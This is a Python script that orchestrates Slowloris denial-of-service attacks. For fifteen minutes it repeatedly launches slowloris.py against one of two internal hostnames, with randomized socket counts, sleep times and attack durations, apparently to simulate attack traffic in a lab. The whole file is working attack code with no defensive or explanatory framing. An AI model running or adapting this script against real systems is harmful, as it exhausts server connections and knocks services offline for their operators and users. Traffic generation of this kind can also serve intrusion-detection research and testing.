import os
import time
import random

hosts_l = ['tmp.tpr.local','tmp2.tpr.local']
sleeptime_l = [4,9,14]              # secs
sockets_range = (150, 200)          # connections
duration_range = (2, 6)             # mins
attack_interval_range = (30, 90)    # secs

def run_attack(timeout, host, sockets, sleeptime):
    command = 'timeout {secs}s python3 slowloris.py {host} -ua -s {sockets} --sleeptime {sleeptime}'
    command = command.format(
        secs=timeout,
        host=host,
        sockets=sockets,
        sleeptime=sleeptime,
    )
    print(command)
    os.system(command)


max_duration = 15 * 60  # secs
total_duration = 0      # secs
while total_duration < max_duration:
    start = time.time()

    attack_duration = random.randrange(duration_range[0], duration_range[1])
    attack_duration *= 60
    if total_duration + attack_duration >= max_duration:
        attack_duration = (max_duration - total_duration)
    
    print('attack for {} secs'.format(attack_duration))
    run_attack(
        attack_duration,                                        # timeout in seconds
        random.choice(hosts_l),                                 # host
        random.randrange(sockets_range[0], sockets_range[1]),   # sockets
        random.choice(sleeptime_l),                             # sleeptime
    )
    print('attack end')

    # wait_next_attack = random.randrange(attack_interval_range[0], attack_interval_range[1])
    # print('sleep for {} secs'.format(wait_next_attack))
    # time.sleep(wait_next_attack)

    end = time.time()

    elapsed = end - start
    print('elapsed: {}'.format(elapsed))
    total_duration += elapsed
    print('time progress: {:.2f}/{}'.format(total_duration, max_duration))
